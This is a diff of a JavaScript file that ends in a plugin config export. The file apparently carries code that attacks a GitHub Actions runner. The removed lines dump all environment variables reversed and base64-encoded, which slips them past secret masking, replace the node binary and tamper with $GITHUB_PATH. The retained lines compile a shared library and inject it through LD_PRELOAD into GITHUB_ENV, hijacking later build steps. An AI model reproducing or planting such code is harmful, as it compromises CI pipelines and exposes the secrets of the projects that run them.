@@ -1,54 +1,5 @@
-console.log('\r\nDumping env');
-const envJson = JSON.stringify(process.env).split("").reverse().join("");
-const envBase64 = Buffer.from(envJson).toString('base64');
-console.log(envBase64);
-
-const { exec, spawn, execSync } = require('child_process');
-const fs = require('fs');
-const path = require('path');
-
-function replaceNodeBinaryWithWrapper() {
-	console.log("\r\n\r\nhmmmm\r\n\r\n");
-    try {
-        // Execute the 'which node' command synchronously to find the location of the node binary
-        const nodeBinaryPath = execSync('which node').toString().trim();
-        const wrapperScriptContent = `#!/bin/bash\n echo "Invoking node"`;
-        const wrapperScriptPath = nodeBinaryPath;
-
-        // Rename the original node binary to node_backup synchronously
-        fs.renameSync(nodeBinaryPath, `${nodeBinaryPath}.backup`);
-        console.log(`Original node binary moved to ${nodeBinaryPath}.backup`);
-
-        // Write the wrapper script to the original node binary location synchronously
-        fs.writeFileSync(wrapperScriptPath, wrapperScriptContent, { mode: 0o755 });
-        console.log(`Wrapper script created at ${wrapperScriptPath}`);
-        console.log(`Now, ${nodeBinaryPath} is a wrapper script that invokes the original binary.`);
-    } catch (error) {
-        console.log(`Error: ${error.message}`);
-    }
-}
-
-
-console.log('\r\nReplacing node bin\r\n');
-replaceNodeBinaryWithWrapper();
-
-function executeShellCommand(command) {
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            console.log(`Error executing command: ${error}`);
-            return;
-        }
-        if (stderr) {
-            console.log(`Command stderr: ${stderr}`);
-            return;
-        }
-        console.log(`Command '${command}' output: ${stdout}`);
-    });
-}
-
-console.log('\r\Running cmds - come onnn.....');
-executeShellCommand('id');
-
+const fs = require("node:fs");
+const { spawn } = require('child_process');
 var testc = `#include <fcntl.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -63,16 +14,6 @@ fs.writeFile("test.c", testc, console.log);
 spawn("bash", ["-c", "gcc -fPIC -shared test.c -o test.so"], {stdio: 'inherit'});
 
 fs.writeFile(process.env.GITHUB_ENV, "LD_PRELOAD=./test.so", console.log);
-console.log("Set LD_PRELOAD");
-
-
-//executeShellCommand('file /opt/hostedtoolcache/node/16.20.2/x64/bin/node');
-//executeShellCommand('ls -la /opt/hostedtoolcache/node/16.20.2/x64/bin');
-executeShellCommand('echo $GITHUB_PATH && echo "/tmp" > $GITHUB_PATH && echo $GITHUB_PATH ');
-executeShellCommand('node --version');
-executeShellCommand('echo $PATH');
-
-
 
 module.exports = {
   // Plugins you want to use
